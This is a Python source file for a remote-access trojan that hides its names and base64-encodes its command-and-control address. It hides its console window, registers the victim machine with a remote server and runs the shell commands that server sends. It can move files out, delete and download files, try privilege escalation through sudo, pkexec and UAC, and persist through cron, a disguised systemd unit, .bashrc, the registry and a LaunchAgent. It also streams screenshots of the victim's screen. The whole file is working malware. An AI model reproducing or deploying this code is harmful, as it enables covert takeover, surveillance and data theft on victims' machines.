import socket as _s0
import os as _s1
import sys as _s2
import time as _s3
import base64 as _s5
import platform as _s6
import subprocess as _s7
import ctypes as _sa
import shutil as _s9
import requests as _sc
import threading as _s8
import io as _sb

# ═══════════════════════════════════════════════════════════════════
# ⚙️ CONFIG
# ═══════════════════════════════════════════════════════════════════
_K = "aHR0cHM6Ly9wcm9tYWwuYXltZW5saW51eC53b3JrZXJzLmRldg=="
_U = _s5.b64decode(_K.encode()).decode()

_R = 180
_P = 5
_Q = 15
_F = 5

_E = False
_FPS = 30
_QUAL = 40
_WIDTH = 1280

_A = False
_N = 0
_LOCK = _s8.Lock()

_W = _s6.system() == "Windows"
_L = _s6.system() == "Linux"
_M = _s6.system() == "Darwin"

_START_TIME = _s3.time()

# ═══════════════════════════════════════════════════════════════════
# 🕵️ HIDE CONSOLE (Windows)
# ═══════════════════════════════════════════════════════════════════
if _W:
    try:
        _kernel32 = _sa.windll.kernel32
        _user32 = _sa.windll.user32
        _hwnd = _kernel32.GetConsoleWindow()
        if _hwnd:
            _user32.ShowWindow(_hwnd, 0)
    except:
        pass

try:
    _null = open(_s1.devnull, 'w')
    _s2.stdout = _null
    _s2.stderr = _null
except:
    pass

# ═══════════════════════════════════════════════════════════════════
# 🆔 BOT ID
# ═══════════════════════════════════════════════════════════════════
def _x0():
    try:
        _h = _s0.gethostname()
        _u = _s1.environ.get('USERNAME') or _s1.environ.get('USER') or _s1.environ.get('LOGNAME') or 'user'
        _b = _h + "_" + _u
        return ''.join(c for c in _b if c.isalnum() or c in '_-')
    except:
        return "unknown_bot"

_I = _x0()

# ═══════════════════════════════════════════════════════════════════
# 🏓 PING
# ═══════════════════════════════════════════════════════════════════
def _x1():
    try:
        _t0 = _s3.time()
        _sc.get(_U, timeout=5)
        return int((_s3.time() - _t0) * 1000)
    except:
        return 999

# ═══════════════════════════════════════════════════════════════════
# 📡 REGISTER
# ═══════════════════════════════════════════════════════════════════
def _x2():
    global _A, _N
    try:
        _p = _x1()
        _uid = _s1.geteuid() if hasattr(_s1, 'geteuid') else 0
        _d = {
            "id": _I,
            "hostname": _s0.gethostname(),
            "user": _s1.environ.get('USERNAME') or _s1.environ.get('USER') or 'unknown',
            "os": _s6.system() + " " + _s6.release(),
            "cwd": _s1.getcwd(),
            "ping": _p,
            "uid": _uid,
        }
        _r = _sc.post(_U + "/register", json=_d, timeout=_Q)
        with _LOCK:
            _N += 1
        if _r.status_code == 200:
            try:
                if _r.json().get("status") == "ok":
                    _A = True
                    return True
            except:
                pass
        _A = False
        return False
    except:
        _A = False
        return False

# ═══════════════════════════════════════════════════════════════════
# 📡 GET COMMAND
# ═══════════════════════════════════════════════════════════════════
def _x3():
    global _A
    try:
        _r = _sc.get(_U + "/get_command/" + _I, timeout=_Q)
        if _r.status_code == 200:
            _A = True
            return _r.json()
        return {"command": ""}
    except:
        return {"command": ""}

# ═══════════════════════════════════════════════════════════════════
# 📤 SEND RESULT
# ═══════════════════════════════════════════════════════════════════
def _x4(_r, _t):
    try:
        _p = _x1()
        _sc.post(_U + "/send_result", json={
            "bot_id": _I,
            "result": _r,
            "task_id": _t,
            "cwd": _s1.getcwd(),
            "ping": _p,
        }, timeout=_Q)
        return True
    except:
        return False

# ═══════════════════════════════════════════════════════════════════
# 🖥️ RUN (Cross-Platform)
# ═══════════════════════════════════════════════════════════════════
def _run(_c):
    try:
        if _W:
            _pr = _s7.Popen(
                _c,
                shell=True,
                stdout=_s7.PIPE,
                stderr=_s7.STDOUT,
                stdin=_s7.DEVNULL,
                creationflags=0x08000000,
            )
        elif _L or _M:
            _c = "timeout 60 " + _c
            _pr = _s7.Popen(
                _c,
                shell=True,
                stdout=_s7.PIPE,
                stderr=_s7.STDOUT,
                stdin=_s7.DEVNULL,
                executable='/bin/bash' if _L else '/bin/zsh',
            )
        else:
            return "[Unsupported OS]"
        
        _ou, _ = _pr.communicate()
        try:
            _ou = _ou.decode('utf-8', errors='ignore')
        except:
            pass
        return _ou if _ou and _ou.strip() else "[Command executed - no output]"
    except:
        return "[Error executing command]"

# ═══════════════════════════════════════════════════════════════════
# 👑 ADMIN (Cross-Platform)
# ═══════════════════════════════════════════════════════════════════
def _admin():
    global _A
    
    try:
        if _W:
            if _sa.windll.shell32.IsUserAnAdmin():
                return "Already Administrator"
            
            _script = _s1.path.abspath(_s2.argv[0])
            _result = _sa.windll.shell32.ShellExecuteW(
                None, "runas", _s2.executable,
                f'"{_script}"', None, 1
            )
            if _result > 32:
                _s3.sleep(2)
                _s2.exit(0)
            return "UAC prompt shown"
        
        elif _L or _M:
            if _s1.geteuid() == 0:
                return "Already root (uid=0)"
            
            _script = _s1.path.abspath(_s2.argv[0])
            _has_display = bool(_s1.environ.get('DISPLAY'))
            _old_pid = _s1.getpid()
            
            try:
                _s7.check_output(['sudo', '-n', 'true'], stderr=_s7.DEVNULL, timeout=3)
                _s7.Popen(['sudo', '-n', _s2.executable, _script],
                          stdout=_s7.DEVNULL, stderr=_s7.DEVNULL,
                          start_new_session=True)
                _s3.sleep(2)
                try:
                    _s7.Popen(['kill', '-9', str(_old_pid)])
                except:
                    pass
                _s2.exit(0)
            except:
                pass
            
            if _has_display:
                try:
                    _s7.Popen(['pkexec', _s2.executable, _script],
                              stdout=_s7.DEVNULL, stderr=_s7.DEVNULL,
                              start_new_session=True)
                    _s3.sleep(3)
                    try:
                        _s7.Popen(['kill', '-9', str(_old_pid)])
                    except:
                        pass
                    _s2.exit(0)
                except:
                    pass
            
            if _has_display:
                try:
                    _s7.Popen(['xterm', '-e', 'sudo', _s2.executable, _script],
                              stdout=_s7.DEVNULL, stderr=_s7.DEVNULL,
                              start_new_session=True)
                    _s3.sleep(3)
                    try:
                        _s7.Popen(['kill', '-9', str(_old_pid)])
                    except:
                        pass
                    _s2.exit(0)
                except:
                    pass
            
            if _has_display and _L:
                try:
                    _s7.Popen(['gnome-terminal', '--', 'sudo', _s2.executable, _script],
                              stdout=_s7.DEVNULL, stderr=_s7.DEVNULL,
                              start_new_session=True)
                    _s3.sleep(3)
                    try:
                        _s7.Popen(['kill', '-9', str(_old_pid)])
                    except:
                        pass
                    _s2.exit(0)
                except:
                    pass
            
            return "Cannot escalate"
        
        else:
            return "Unsupported OS"
    
    except Exception as _e:
        return f"Admin error: {_e}"

# ═══════════════════════════════════════════════════════════════════
# 🦠 VIRUS
# ═══════════════════════════════════════════════════════════════════
def _virus():
    try:
        _script = _s1.path.abspath(_s2.argv[0])
        _uid = _s1.geteuid() if hasattr(_s1, 'geteuid') else 0
        _pid = _s1.getpid() if hasattr(_s1, 'getpid') else 0
        _ppid = _s1.getppid() if hasattr(_s1, 'getppid') else 0
        
        _runtime = int(_s3.time() - _START_TIME)
        _hours = _runtime // 3600
        _mins = (_runtime % 3600) // 60
        _secs = _runtime % 60
        
        _info = [
            "=== VIRUS INFO ===",
            "  Script:    " + _script,
            "  PID:       " + str(_pid),
            "  PPID:      " + str(_ppid),
            "  UID:       " + str(_uid),
            "  User:      " + (_s1.environ.get('USERNAME') or _s1.environ.get('USER') or 'unknown'),
            "  Hostname:  " + _s0.gethostname(),
            "  CWD:       " + _s1.getcwd(),
            "  Bot ID:    " + _I,
            "  Python:    " + _s6.python_version(),
            "  Platform:  " + _s6.system() + " " + _s6.release(),
            "  Arch:      " + _s6.machine(),
            "  Runtime:   " + f"{_hours}h {_mins}m {_secs}s",
            "  Registers: " + str(_N),
            "  Connected: " + str(_A),
        ]
        
        if _W:
            _startup = _s1.path.join(
                _s1.environ.get('APPDATA', ''),
                'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup'
            )
            _info.append("  Startup:   " + _startup)
            _info.append("  Registry:  HKCU\\...\\Run")
        else:
            _info.append("  Cron:      crontab -l")
            _info.append("  systemd:   systemctl --user status sys-update")
        
        _info.append("===================")
        return "\n".join(_info)
    except Exception as _e:
        return f"Virus error: {_e}"

# ═══════════════════════════════════════════════════════════════════
# 💻 EXECUTE
# ═══════════════════════════════════════════════════════════════════
def _xa(_c):
    global _E, _FPS, _QUAL, _WIDTH, _A
    
    _c = _c.strip()
    if not _c:
        return "[Empty]"
    
    # ─── Basic ───
    if _c == "pwd":
        return _s1.getcwd()
    if _c == "cd":
        return _s1.getcwd()
    if _c.startswith("cd "):
        _p = _c[3:].strip()
        if _p == "~":
            _p = _s1.path.expanduser("~")
        try:
            _s1.chdir(_p)
            return "Changed to: " + _s1.getcwd()
        except:
            return "[cd failed]"
    if _c == "whoami":
        return _s1.environ.get('USERNAME') or _s1.environ.get('USER') or 'unknown'
    if _c == "hostname":
        return _s0.gethostname()
    if _c in ("exit", "quit", "kill"):
        return "EXIT_SIGNAL"
    
    # ─── VIRUS ───
    if _c == "virus":
        return _virus()
    
    # ─── SYSINFO ───
    if _c in ("sysinfo", "system", "info"):
        _uid = _s1.geteuid() if hasattr(_s1, 'geteuid') else 0
        _i = [
            "=== SYSTEM INFO ===",
            "  OS:          " + _s6.system() + " " + _s6.release(),
            "  Arch:        " + _s6.machine(),
            "  Python:      " + _s6.python_version(),
            "  Hostname:    " + _s0.gethostname(),
            "  User:        " + (_s1.environ.get('USERNAME') or _s1.environ.get('USER') or 'unknown'),
            "  UID:         " + str(_uid),
            "  CWD:         " + _s1.getcwd(),
            "  Bot ID:      " + _I,
            "  Connected:   " + str(_A),
            "  Registers:   " + str(_N),
            "  Script:      " + _s1.path.abspath(_s2.argv[0]),
            "==================="
        ]
        return "\n".join(_i)
    
    # ─── FILES — ls with PATH ───
    if _c.startswith("ls ") or _c.startswith("dir "):
        _p = _c.split(" ", 1)[1].strip()
        try:
            _fs = sorted(_s1.listdir(_p))
            if not _fs:
                return "[Empty directory]"
            _rs = []
            for _f in _fs:
                _fp = _s1.path.join(_p, _f)
                try:
                    if _s1.path.isdir(_fp):
                        _rs.append("[DIR]  " + _f + "/")
                    else:
                        _sz = _s1.path.getsize(_fp)
                        _rs.append("[FILE] " + _f + " (" + str(_sz) + "B)")
                except:
                    _rs.append("[?]    " + _f)
            return "\n".join(_rs)
        except Exception as _e:
            return "Error: " + str(_e)
    
    # ─── FILES — ls without path ───
    if _c in ("ls", "dir"):
        try:
            _fs = sorted(_s1.listdir("."))
            if not _fs:
                return "[Empty directory]"
            _rs = []
            for _f in _fs:
                try:
                    if _s1.path.isdir(_f):
                        _rs.append("[DIR]  " + _f + "/")
                    else:
                        _sz = _s1.path.getsize(_f)
                        _rs.append("[FILE] " + _f + " (" + str(_sz) + "B)")
                except:
                    _rs.append("[?]    " + _f)
            return "\n".join(_rs)
        except:
            return "[ls failed]"
    
    if _c.startswith("cat ") or _c.startswith("type "):
        _p = _c.split(" ", 1)
        if len(_p) < 2:
            return "Usage: cat <file>"
        try:
            with open(_p[1].strip(), 'r', encoding='utf-8', errors='replace') as _f:
                _ct = _f.read()
            if len(_ct) > 5000:
                return _ct[:5000] + "\n\n[...truncated]"
            return _ct if _ct else "[Empty file]"
        except:
            return "[cat failed]"
    
    if _c.startswith("write "):
        _p = _c.split(" ", 2)
        if len(_p) < 3:
            return "Usage: write <file> <content>"
        try:
            with open(_p[1], 'w', encoding='utf-8') as _f:
                _f.write(_p[2])
            return "Written to " + _p[1]
        except:
            return "[write failed]"
    
    if _c.startswith("rm ") or _c.startswith("del "):
        _p = _c.split(" ", 1)
        if len(_p) < 2:
            return "Usage: rm <path>"
        _pp = _p[1].strip()
        try:
            if _s1.path.isdir(_pp):
                _s9.rmtree(_pp)
                return "Deleted directory: " + _pp
            else:
                _s1.remove(_pp)
                return "Deleted file: " + _pp
        except:
            return "[rm failed]"
    
    if _c.startswith("mkdir "):
        _p = _c[6:].strip()
        try:
            _s1.makedirs(_p, exist_ok=True)
            return "Created directory: " + _p
        except:
            return "[mkdir failed]"
    
    # ─── READ B64 ───
    if _c.startswith("readb64 "):
        _p = _c[8:].strip()
        try:
            with open(_p, 'rb') as _f:
                _dt = _f.read()
            return _s5.b64encode(_dt).decode('ascii')
        except Exception as _e:
            return "[readb64 failed: " + str(_e) + "]"
    
    # ─── WRITE B64 ───
    if _c.startswith("writeb64 "):
        _p = _c.split(" ", 2)
        if len(_p) < 3:
            return "Usage: writeb64 <path> <base64>"
        try:
            _dt = _s5.b64decode(_p[2])
            with open(_p[1], 'wb') as _f:
                _f.write(_dt)
            return "File written: " + _p[1]
        except Exception as _e:
            return "[writeb64 failed: " + str(_e) + "]"
    
    # ─── NETWORK ───
    if _c in ("myip", "publicip"):
        try:
            _r = _sc.get("https://api.ipify.org", timeout=5)
            return "Public IP: " + _r.text
        except:
            return "[myip failed]"
    
    if _c == "ping":
        return "Bot ID: " + _I + "\nConnected: " + str(_A) + "\nRegisters: " + str(_N)
    
    # ─── PROCESSES ───
    if _c in ("ps", "processes", "tasklist"):
        try:
            import psutil as _pu
            _pr = ["PID      CPU   MEM   NAME"]
            for _p in _pu.process_iter(['pid', 'name', 'cpu_percent', 'memory_percent']):
                try:
                    _pr.append(str(_p.info['pid']).ljust(9) + str(round(_p.info['cpu_percent'], 1)).ljust(7) + str(round(_p.info['memory_percent'], 1)).ljust(7) + _p.info['name'][:40])
                except:
                    pass
                if len(_pr) > 30:
                    break
            return "\n".join(_pr)
        except ImportError:
            return "psutil not installed"
    
    # ─── ADMIN ───
    if _c == "admin":
        return _admin()
    
    # ─── PERSIST ───
    if _c == "persist":
        try:
            _sp = _s1.path.abspath(_s2.argv[0])
            
            if _W:
                _st = _s1.path.join(_s1.environ.get('APPDATA', ''), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
                _de = _s1.path.join(_st, _s1.path.basename(_sp))
                _s9.copy(_sp, _de)
                
                try:
                    import winreg
                    _key = winreg.OpenKey(
                        winreg.HKEY_CURRENT_USER,
                        r"Software\Microsoft\Windows\CurrentVersion\Run",
                        0, winreg.KEY_SET_VALUE
                    )
                    winreg.SetValueEx(_key, "SystemUpdate", 0, winreg.REG_SZ, _sp)
                    winreg.CloseKey(_key)
                except:
                    pass
                
                return "Persistence (Windows): " + _de
            
            elif _L:
                _msgs = []
                
                try:
                    _cr = "@reboot python3 " + _sp + " &"
                    _s1.system('(crontab -l 2>/dev/null; echo "' + _cr + '") | crontab -')
                    _msgs.append("Cron")
                except:
                    pass
                
                try:
                    _sd = """[Unit]
Description=System Update
After=network.target

[Service]
Type=simple
ExecStart=/usr/bin/python3 """ + _sp + """
Restart=always
RestartSec=10

[Install]
WantedBy=default.target
"""
                    _sdp = _s1.path.expanduser("~/.config/systemd/user/sys-update.service")
                    _s1.makedirs(_s1.path.dirname(_sdp), exist_ok=True)
                    with open(_sdp, 'w') as _f:
                        _f.write(_sd)
                    _s1.system('systemctl --user daemon-reload 2>/dev/null')
                    _s1.system('systemctl --user enable sys-update.service 2>/dev/null')
                    _msgs.append("systemd")
                except:
                    pass
                
                try:
                    _brc = _s1.path.expanduser("~/.bashrc")
                    with open(_brc, 'a') as _f:
                        _f.write("\n# System Update\npython3 " + _sp + " &\n")
                    _msgs.append(".bashrc")
                except:
                    pass
                
                return "Persistence (Linux): " + ", ".join(_msgs)
            
            elif _M:
                _la_dir = _s1.path.expanduser("~/Library/LaunchAgents")
                _s1.makedirs(_la_dir, exist_ok=True)
                
                _plist = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.sys.update</string>
    <key>ProgramArguments</key>
    <array>
        <string>/usr/bin/python3</string>
        <string>""" + _sp + """</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
</dict>
</plist>
"""
                _plp = _s1.path.join(_la_dir, "com.sys.update.plist")
                with open(_plp, 'w') as _f:
                    _f.write(_plist)
                
                _s1.system(f'launchctl load "{_plp}" 2>/dev/null')
                return "Persistence (macOS): " + _plp
            
            return "[Unsupported OS]"
        except Exception as _e:
            return f"[persist failed: {_e}]"
    
    # ─── SCREENSHOT ───
    if _c in ("screenshot", "screen", "ss"):
        try:
            from PIL import ImageGrab as _ig
            _fn = "screenshot_" + str(int(_s3.time())) + ".png"
            _ig.grab().save(_fn)
            return "Screenshot saved: " + _fn
        except:
            return "[screenshot failed — install pillow]"
    
    # ─── LIVE STREAM ───
    if _c.startswith("livestream"):
        _p = _c.split()
        try:
            if len(_p) >= 2: _FPS = int(_p[1])
            if len(_p) >= 3: _QUAL = int(_p[2])
            if len(_p) >= 4: _WIDTH = int(_p[3])
        except:
            pass
        _E = True
        
        def _sl():
            while _E:
                try:
                    from PIL import ImageGrab as _ig
                    _im = _ig.grab()
                    if _im.width > _WIDTH:
                        _ra = _WIDTH / _im.width
                        _nh = int(_im.height * _ra)
                        _im = _im.resize((_WIDTH, _nh))
                    _bf = _sb.BytesIO()
                    _im.save(_bf, format='JPEG', quality=_QUAL)
                    _b64 = _s5.b64encode(_bf.getvalue()).decode('ascii')
                    _sc.post(_U + "/stream_frame", json={
                        "bot_id": _I,
                        "frame": _b64,
                        "timestamp": int(_s3.time() * 1000)
                    }, timeout=5)
                    _s3.sleep(1.0 / _FPS)
                except:
                    _s3.sleep(0.5)
        
        _t = _s8.Thread(target=_sl, daemon=True)
        _t.start()
        return "Live stream started"
    
    if _c == "stopstream":
        _E = False
        return "Live stream stopping..."
    
    # ─── DOWNLOAD ───
    if _c.startswith("download "):
        _p = _c.split(" ", 2)
        if len(_p) < 3:
            return "Usage: download <url> <path>"
        try:
            import urllib.request as _ur
            _ur.urlretrieve(_p[1], _p[2])
            return "Downloaded: " + _p[2]
        except:
            return "[download failed]"
    
    return _run(_c)

# ═══════════════════════════════════════════════════════════════════
# 🔄 THREADS
# ═══════════════════════════════════════════════════════════════════
def _thread_connection():
    while True:
        try:
            _x2()
            _s3.sleep(_R)
        except:
            _s3.sleep(_F)

def _thread_commands():
    while True:
        try:
            _d = _x3()
            if _d.get("command"):
                _c = _d["command"]
                _t = _d.get("task_id", "unknown")
                _r = _xa(_c)
                if _r == "EXIT_SIGNAL":
                    _x4("Bot exiting...", _t)
                    _s2.exit(0)
                _x4(_r, _t)
            _s3.sleep(_P)
        except:
            _s3.sleep(_F)

# ═══════════════════════════════════════════════════════════════════
# 🚀 MAIN
# ═══════════════════════════════════════════════════════════════════
def _xb():
    _t1 = _s8.Thread(target=_thread_connection, daemon=True)
    _t1.start()
    _t2 = _s8.Thread(target=_thread_commands, daemon=True)
    _t2.start()
    try:
        while True:
            _s3.sleep(1)
    except KeyboardInterrupt:
        pass

if __name__ == "__main__":
    try:
        _xb()
    except:
        pass